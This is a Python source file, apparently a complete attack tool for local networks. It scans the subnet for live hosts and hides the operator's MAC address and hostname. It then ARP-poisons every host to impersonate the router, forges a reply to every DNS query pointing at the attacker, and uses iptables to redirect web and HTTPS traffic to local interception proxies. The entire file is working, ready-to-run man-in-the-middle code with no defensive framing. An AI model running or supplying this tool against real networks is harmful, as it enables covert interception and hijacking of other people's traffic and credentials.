import gevent
from gevent import monkey, pool
monkey.patch_all(thread=False)

from scapy.all import *
from multiprocessing import Process
import sys, os, re, subprocess

BROADCAST = "ff:ff:ff:ff:ff:ff"

pool = gevent.pool.Pool(size=255)

def get_router_IP():
    for route in read_routes():
        if route[0] == 0 and route[3] == conf.iface:
            return route[2]

def get_network():
    for route in read_routes():
        if (route[3] == conf.iface and route[0] 
            and not ltoa(route[0]).startswith("169")):
            return ltoa(route[0])
    raise OSError("Network address could not be found")

def get_netmask():
    packed = get_if(conf.iface, SIOCGIFNETMASK)[20:24]
    return "{0:032b}".format(struct.unpack("I", packed)[0]).count("1")

def alive_hosts(network, netmask):
    subnet = "%s/%s" % (network, netmask)

    if netmask <= 20:
        netmask = None
    elif netmask <= 22:
        interval = 0.001
    elif netmask < 24:
        interval = 0.01
    else:
        interval = 0.1

    pkt = Ether(dst=BROADCAST) / ARP(pdst=subnet)
    ans, unans = srp(pkt, verbose=False, filter="arp and arp[7] = 2", 
                     timeout=1, inter=interval, iface_hint=subnet)
    return [rcv.psrc for snd, rcv in ans]

def spoof_DNS(timeout=None):
    host_IP = get_if_addr(conf.iface)
    reply = IP() / UDP(sport=53) / DNS(qr=1, rd=1, ra=1, qdcount=1, ancount=1,
        qd=DNSQR(qtype="A", qclass="IN"),
        an=DNSRR(type="A", rclass="IN", rdlen=4, 
                 ttl=90, rdata=host_IP))

    def reply_dns(pkt):
        try:
            reply[DNS].id = pkt[DNS].id
            reply[IP].dst, reply[IP].src = pkt[IP].src, pkt[IP].dst
            reply.dport = pkt.sport
            reply.qd.qname = reply.an.rrname = pkt.qd.qname
            send(reply, verbose=False)
        except:
            pass
    try:
        sniff(filter="udp dst port 53", prn=reply_dns, timeout=timeout)
    except:
        pass

def loop_ARP(target, router_IP):
    ARP_pkt = Ether(dst=BROADCAST) / ARP(psrc=router_IP, pdst=target)
    while True:
        sendp(ARP_pkt, verbose=False)
        gevent.sleep(2)

def send_ARPs(targets, router_IP, timeout=None):
    for target in targets:
        pool.spawn(loop_ARP, target, router_IP)
    pool.join(timeout=timeout)

def restore_ARP(targets, router_IP):
    router_MAC = getmacbyip(router_IP)
    pool.kill() #kill original spoofing greenlets
    #send ARP packets associating router IP with router MAC again
    
    def fix(target):
        ARP_pkt = (Ether(dst=BROADCAST) /
                   ARP(op="is-at", hwsrc=router_MAC, psrc=router_IP, pdst=target))
        sendp(ARP_pkt, verbose=False)

    gevent.joinall([gevent.spawn(fix, target) for target in targets], timeout=10)

def randomize():
    rand = random.sample("ABCDEFGZ", random.randint(3, 8))
    cmd = "hostname %s" % rand
    subprocess.check_call(cmd, shell=True)
    cmd = "ifconfig %s down" % conf.iface
    subprocess.check_call(cmd, shell=True)
    cmd = "macchanger -r %s" % conf.iface
    subprocess.check_call(cmd, shell=True)
    cmd = "ifconfig %s up" % conf.iface
    subprocess.check_call(cmd, shell=True)
    
def begin_redirect():
    cmd = "iptables -t nat -A PREROUTING -p tcp -m multiport "
    cmd += "--dports 80,8080 -j REDIRECT --to-port 8888"
    subprocess.check_call(cmd, shell=True)
    cmd = "iptables -t nat -A PREROUTING -p tcp -m tcp "
    cmd += "--dport 443 -j REDIRECT --to-port 8899"
    subprocess.check_call(cmd, shell=True)

def end_redirect():
    cmd = "iptables -t nat -D PREROUTING -p tcp -m multiport "
    cmd += "--dports 80,8080 -j REDIRECT --to-port 8888"
    subprocess.check_call(cmd, shell=True)
    cmd = "iptables -t nat -D PREROUTING -p tcp -m tcp "
    cmd += "--dport 443 -j REDIRECT --to-port 8899"
    subprocess.check_call(cmd, shell=True)

def spoof(timeout=None):
    router_IP = get_router_IP()
    network = get_network()
    netmask = get_netmask()
    
    print "Randomizing MAC address and hostname..."
    randomize()
    print "Finding alive hosts, please wait..."
    targets = alive_hosts(network, netmask) 
    if router_IP in targets:
        targets.remove(router_IP)
    
    if not targets:
        print "No hosts found. Exiting."
        os._exit(1)

    print "%d targets found" % len(targets)

    print "Beginning ARP and DNS spoofing"
    begin_redirect()
    try:
        #spawn a new process for DNS spoofing
        Process(target=spoof_DNS, args=(timeout,)).start()
        #ARP spoofing runs in main thread
        send_ARPs(targets, router_IP, timeout=timeout)
        if timeout:
            print "Finished after %d seconds\n" % timeout
    except:
        pass
    finally:
        end_redirect()
        restore_ARP(targets, router_IP)
        print "Stopped: ARP tables restored and iptables rules reset"

if __name__ == "__main__":
    spoof()
